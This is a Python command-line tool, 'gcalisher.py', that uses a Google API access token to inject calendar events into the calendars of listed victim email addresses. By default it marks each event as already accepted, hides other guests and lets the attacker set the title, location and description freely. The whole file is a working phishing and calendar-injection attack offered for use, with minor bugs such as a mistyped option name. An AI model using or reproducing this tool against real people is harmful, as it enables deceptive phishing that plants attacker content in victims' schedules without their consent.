#!/usr/bin/env python

import requests
import sys, getopt

def main(argv):
    attacker_email = ''
    access_token = ''
    targets = ''
    target_list = []
    target_json_list = []
    start_DateTime = ''
    finish_DateTime = ''
    event_title = ''
    event_location = ''
    event_description = ''
    time_zone = "America/Chicago"
    allow_modify = "false"
    allow_invite_others = "true"
    show_invitees = "false"
    response_status = "accepted"

    # usage
    usage = '\nusage: gcalisher.py [-h] -e <ATTACKER EMAIL> -x <TARGETS> [TARGETS, ...]\n'
    usage += '\t-a <ACCESS TOKEN> -s <START DATETIME> -f <FINISH DATETIME>\n'
    usage += '\t[-t <EVENT TITLE>] [-l <EVENT LOCATION>]\n'
    usage += '\t[-d <EVENT DESCRIPTION>] [-z <TIME ZONE> (default = America/Chicago)]\n'
    usage += '\t[-m <ALLOW MODIFY>] [-i <ALLOW INVITE OTHERS> [{true, false}] (default = true)]\n'
    usage += '\t[-o <SHOW INVITEES> [{true, false}] (default = false)]\n'
    usage += '\t[-r <RESPONSE STATUS>[{needsAction,declined,tentative,accepted}] (default = accepted)]\n'

    #help
    help = '\nThis module will connect to Google\'s API using an access token and'
    help += 'inject a \ncalendar event into a target\'s calendar.'
    help += '\n\narguments:'
    help += '\n\t-e <ATTACKER EMAIL>, --attacker_email <ATTACKER EMAIL>'
    help += '\n\t\t\tEmail address of the Google account you are doing the'
    help += '\n\t\t\tinjection as. (Attacker email address)'
    help += '\n\t-x <TARGETS> [TARGETS,...], --targets <TARGETS> [TARGETS ...]'
    help += '\n\t\t\tComma-seperated list of victim email addresses'
    help += '\n\t-a <ACCESS TOKEN>, --access_token <ACCESS TOKEN>'
    help += '\n\t\t\tGoogle API Access Token.'
    help += '\n\t-s <START DATETIME>, --start_DateTime <START DATETIME>'
    help += '\n\t\t\tStart date and time for the event in the format of'
    help += '\n\t\t\tYYYY-MM-DDTHH:MM:SSlike this: 2019-08-16T20:00:00 for'
    help += '\n\t\t\tAugust 16, 2019 at 8:00:00 PM'
    help += '\n\t-f <FINISH DATETIME>, --finish_DateTime <FINISH DATETIME>'
    help += '\n\t\t\tFinish date and time for the event in the format of'
    help += '\n\t\t\tYYYY-MM-DDTHH:MM:SSlike this: 2019-08-16T20:00:00 for'
    help += '\n\t\t\tAugust 16, 2019 at 8:00:00 PM'
    help += '\n\noptional arguments:'
    help += '\n\t-t <EVENT TITLE>, --event_title <EVENT TITLE>'
    help += '\n\t\t\tTitle of the Google calendar event'
    help += '\n\t-l <EVENT LOCATION>, --event_location <EVENT LOCATION>'
    help += '\n\t\t\tLocation field for the event'
    help += '\n\t-d <EVENT DESCRIPTION>, --event_description <EVENT DESCRIPTION>'
    help += '\n\t\t\tDescription field for the event'
    help += '\n\t-z [<TIME ZONE>], --time_zone [<TIME ZONE>]'
    help += '\n\t\t\tTime zone for the event in the IANA tz database format:'
    help += '\n\t\t\t"America/New_York" (default: America/Chicago)'
    help += '\n\t-m [{true, false}], --allow_modify [{true, false}]'
    help += '\n\t\t\tIf set to true allows targets to modify the calendar'
    help += '\n\t\t\tentry (default: false)'
    help += '\n\t-i [{true, false}], --allow_invite_others [{true, false}]'
    help += '\n\t\t\tIf set to true allows targets to invite others to the'
    help += '\n\t\t\tcalendar entry (default: true)'
    help += '\n\t-o [{true, false}], --show_invitees [{true, fasle}]'
    help += '\n\t\t\tIf set to true will show all guests added to the event'
    help += '\n\t\t\t(default: false)'
    help += '\n\t-r [{needsAction,declined,tentative,accepted}],'
    help += '\n\t\t\t--response_status [{needsAction,declined,tentative,accepted}]'
    help += '\n\t\t\tCan be "needsAction", "declined", "tentative", or'
    help += '\n\t\t\t"accepted" (default: accepted)'
    help += '\n\n\t-h, --help\t\tshow this help message and exit\n'

# Try parsing options and arguments
    try:
        opts, args = getopt.getopt(argv, "he:x:a:s:f:t:l:d:z:m:i:o:r:",["help","attacker_email=",
            "targets=","access_token=","start_DateTimeat=","finish_DateTime=","event_title=",
            "event_location=","event_description=","time_zone=","allow_modify=","allow_invite_others=",
            "show_invitees=","response_status="])
    except getopt.GetoptError as err:
        print str(err)
        print(usage)
        sys.exit(2)

# Parse argumentss into variables
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()
        if opt in ("-e", "--attacker_email"):
            attacker_email = arg
        if opt in ("-a", "--access_token"):
                access_token = arg
        if opt in ("-s", "--start_DateTime"):
            start_DateTime = arg
        if opt in ("-f", "--finish_DateTime"):
            finish_DateTime = arg
        if opt in ("-x", "--targets"):
            targets = arg
        if opt in ("-t", "--event_title"):
            event_title = arg
        if opt in ("-l", "--event_location"):
            event_location = arg
        if opt in ("-d", "--event_description"):
            event_description = arg
        if opt in ("-m", "--allow_modify"):
            allow_modify = arg
        if opt in ("-i", "--allow_invite_others"):
            allow_invite_others = arg
        if opt in ("-o", "--show_invitees"):
            show_invitees = arg
        if opt in ("-r", "--response_status"):
            response_status = arg
        if opt in ("-z", "--time_zone"):
            time_zone = arg

# check for manadatory arguemnts
    if not attacker_email:
        print("\nAttacker Email (-e, --attacker_email) is a mandatory argument\n")
        print(usage)
        sys.exit(2)
    if not targets:
        print("\nTargets (-x, --targets) is a mandatory argument(s)\n")
        print(usage)
        sys.exit(2)
    if not access_token:
        print("\nAccess Token (-a, --access_token) is a mandatory argument(s)\n")
        print(usage)
        sys.exit(2)
    if not start_DateTime:
        print("\nStart DateTime (-s, --start_DateTime) is a mandatory argument(s)\n")
        print(usage)
        sys.exit(2)
    if not finish_DateTime:
        print("\nFinish DateTime (-f, --finish_DateTime) is a mandatory argument(s)\n")
        print(usage)
        sys.exit(2)



    # api endpoint
    URL = "https://www.googleapis.com/calendar/v3/calendars/" + attacker_email + "/events"

    # Split target string into a list
    target_list = targets.split(",")

    # Event Data and header to be sent to the api
    for target in target_list:
        event = {
            'kind': 'calendar#event',
            'summary': event_title,
            'location': event_location,
            'description': event_description,
            'start': {
                'dateTime': start_DateTime,
                'timeZone': time_zone,
            },
            'end': {
                'dateTime': finish_DateTime,
                'timeZone': time_zone,
            },
            'attendees': [
                {
                    'email': target,
                    'responseStatus': response_status,
                },
            ],
            'guestsCanInviteOthers': allow_invite_others,
            'guestsCanSeeOtherGuests': show_invitees,
            'guestsCanModify': allow_modify,
        }
        header = {
            'Accept': '*/*',
            'User-Agent': 'G-Calisher Agent',
            'Content-Type': 'application/json',
            'Authorization': "Bearer " + access_token,
        }

        # Tell the user what is going on
        print("[*] Now injecting event into target calendar(s): " + target)

        # Post the requests
        response = requests.post(URL, json= event, headers= header)

        #print http response
        print("Response: " + str(response) + "\n")

if __name__ == "__main__":
    main(sys.argv[1:])
